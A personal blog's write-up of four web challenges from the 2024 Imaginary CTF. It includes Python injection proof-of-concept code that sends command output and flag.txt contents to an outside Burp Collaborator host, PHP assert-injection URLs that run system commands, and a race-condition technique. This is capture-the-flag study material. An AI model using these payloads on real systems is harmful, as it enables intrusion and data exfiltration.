@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>2024 Imaginary CTF Writeup</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>xinyue@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>2024 Imaginary CTF Writeup</h2>
+  <time datetime="2024-07-20T00:00:00-07:00" class="by-line">20 Jul 2024</time>
+  <p>Here is a write-up I created for the Web track.</p>
+<h2 id="p2c-python-to-color">P2C (Python To Color)</h2>
+
+<h3 id="description">Description</h3>
+
+<p>Welcome to Python 2 Color, the world’s best color picker from python code!
+The flag is located in <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>
+
+<p><img src="../assets/images/2024_imaginary_CTF/P2C_description.png" alt="" /></p>
+
+<h3 id="source-code">Source code</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">xec</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">indented</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"    "</span> <span class="o">+</span> <span class="n">line</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">code</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()])</span>
+
+    <span class="nb">file</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"/tmp/uploads/code_</span><span class="si">{</span><span class="n">md5</span><span class="p">(</span><span class="n">code</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span><span class="si">}</span><span class="s">.py"</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"def main():</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">indented</span><span class="p">)</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"""</span><span class="se">\n</span><span class="s">from parse import rgb_parse
+print(rgb_parse(main()))"""</span><span class="p">)</span>
+
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"chmod 755 </span><span class="si">{</span><span class="nb">file</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">"sudo"</span><span class="p">,</span> <span class="s">"-u"</span><span class="p">,</span> <span class="s">"user"</span><span class="p">,</span> <span class="s">"python3"</span><span class="p">,</span> <span class="nb">file</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">stdout</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">output</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
+        <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"code"</span><span class="p">]</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">xec</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+        <span class="n">valid</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="sa">r</span><span class="s">"\([0-9]{1,3}, [0-9]{1,3}, [0-9]{1,3}\)"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">res</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">rgb</span><span class="o">=</span><span class="sa">f</span><span class="s">"rgb(</span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">valid</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])):</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">rgb</span><span class="o">=</span><span class="s">"rgb"</span> <span class="o">+</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">rgb</span><span class="o">=</span><span class="sa">f</span><span class="s">"rgb(</span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">rgb</span><span class="o">=</span><span class="sa">f</span><span class="s">"rgb(</span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="short-answer">Short Answer</h3>
+
+<p>Python code injection + burpsuite collaborator exfiltration</p>
+
+<p>Controllable indented value indicates that it is a python code injection vulnerability. But the output is parsed and goes to rgb valuer, so we need another way to exfiltrate command output.</p>
+
+<p>The part that actually execute our command is as follows. It created a new file to store input.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"def main():</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">indented</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Since it is python environment, we can simply write python code to post data to Burp Collaborator. Be sure to use urllib.request here because it’s part of standard python library comparing to requests. Then click <strong>poll now</strong> to get response.</p>
+
+<h3 id="poc">POC</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib.request</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">"ls"</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">stdout</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://cyefjx3rcjlzq6jfcxjwztahr8xzlp9e.oastify.com'</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s">'result'</span><span class="p">:</span> <span class="n">output</span><span class="p">}).</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> 
+<span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+<p><img src="../assets/images/2024_imaginary_CTF/POC_burp.png" alt="" /></p>
+
+<ul>
+  <li>Read Flag</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib.request</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span>
+
+<span class="n">output</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://iyklj33xcpl5qcjlc3j2zzanrex5l29r.oastify.com'</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s">'result'</span><span class="p">:</span> <span class="n">output</span><span class="p">}).</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> 
+<span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+<p><img src="../assets/images/2024_imaginary_CTF/POC_burp2.png" alt="" /></p>
+
+<p><br /></p>
+
+<h2 id="journal">Journal</h2>
+<hr />
+
+<h3 id="description-1">Description</h3>
+
+<p>dear diary, there is no LFI in this app</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">echo</span> <span class="s2">"&lt;p&gt;Welcome to my journal app!&lt;/p&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;a href=/?file=file1.txt&gt;file1.txt&lt;/a&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;a href=/?file=file2.txt&gt;file2.txt&lt;/a&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;a href=/?file=file3.txt&gt;file3.txt&lt;/a&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;a href=/?file=file4.txt&gt;file4.txt&lt;/a&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;a href=/?file=file5.txt&gt;file5.txt&lt;/a&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;p&gt;"</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+  <span class="nv">$filepath</span> <span class="o">=</span> <span class="s1">'./files/'</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">;</span>
+
+  <span class="nb">assert</span><span class="p">(</span><span class="s2">"strpos('</span><span class="nv">$file</span><span class="s2">', '..') === false"</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Invalid file!"</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s1">'File not found!'</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
+
+</code></pre></div></div>
+
+<h3 id="short-answer-1">Short Answer</h3>
+
+<p>LFI via PHP’s ‘assert’</p>
+
+<blockquote>
+  <p>https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert</p>
+
+</blockquote>
+
+<pre><code class="language-url">http://journal.chal.imaginaryctf.org/?file=file1.txt%27%20and%20die(system(%22ls%20/%22))%20or%20%27
+</code></pre>
+
+<p><img src="../assets/images/2024_imaginary_CTF/Journal1.jpg" alt="" /></p>
+
+<pre><code class="language-url">http://journal.chal.imaginaryctf.org/?file=file1.txt%27%20and%20die(system(%22cat%20/flag-cARdaInFg6dD10uWQQgm.txt%22))%20or%20%27
+</code></pre>
+
+<p><img src="../assets/images/2024_imaginary_CTF/Journal2.jpg" alt="" /></p>
+
+<p><br /></p>
+
+<h2 id="the-amazing-race">The Amazing Race</h2>
+
+<hr />
+
+<h3 id="description-2">Description</h3>
+
+<p>I’ve hidden my flag in an impenetrable maze! Try as you might, even though it’s right there, you’ll never get the flag!</p>
+
+<p><img src="../assets/images/2024_imaginary_CTF/TheAmazingRace_desc.png" alt="" /></p>
+
+<h3 id="short-answer-2">Short Answer</h3>
+
+<p>web race condition</p>
+
+<h3 id="details">Details</h3>
+
+<p>Each movement will send a request to backend database to check whether movement is permittted. However, the inconsistence between different  request may open a time window for duplicate movements to somewhere disallowed.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">def</span> <span class="nf">getCanMove</span><span class="p">(</span><span class="n">mazeId</span><span class="p">):</span>
+    <span class="n">con</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s">"/tmp/mazes.db"</span><span class="p">)</span>
+    <span class="n">cur</span> <span class="o">=</span> <span class="n">con</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT up, down, left, right FROM mazes WHERE id = ?"</span><span class="p">,</span> <span class="p">(</span><span class="n">mazeId</span><span class="p">,)).</span><span class="n">fetchone</span><span class="p">()</span>
+    <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">con</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">ret</span>
+</code></pre></div></div>
+
+<p>Since post request implemented http1.1, we used last-byte sync attack.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Burpsuite</span> <span class="nx">Repeater</span> <span class="o">-&gt;</span> <span class="nx">create</span> <span class="nx">group</span> <span class="o">&amp;</span> <span class="nx">duplicate</span> <span class="nx">tabs</span> <span class="o">-&gt;</span> <span class="nx">send</span> <span class="nx">group</span> <span class="k">in</span> <span class="nx">parallel</span> 
+</code></pre></div></div>
+<p><br /></p>
+
+<h2 id="crystals">Crystals</h2>
+
+<hr />
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">version</span><span class="p">:</span> <span class="dl">'</span><span class="s1">3.3</span><span class="dl">'</span>
+<span class="nx">services</span><span class="p">:</span>
+  <span class="nx">deployment</span><span class="p">:</span>
+    <span class="nx">hostname</span><span class="p">:</span> <span class="nx">$FLAG</span>
+    <span class="nx">build</span><span class="p">:</span> <span class="p">.</span>
+    <span class="nx">ports</span><span class="p">:</span>
+      <span class="o">-</span> <span class="mi">10001</span><span class="p">:</span><span class="mi">80</span>
+</code></pre></div></div>
+
+<p><img src="../assets/images/2024_imaginary_CTF/Crystals.png" alt="" /></p>
+
+<h3 id="short-answer-3">Short Answer</h3>
+<p>Abnormal characters in URL are not properly handled.</p>
+
+<p><img src="../assets/images/2024_imaginary_CTF/Crystals_burp.png" alt="" /></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://xxxinhy.github.io/">
+    <span>
+        <b>Xinyue</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
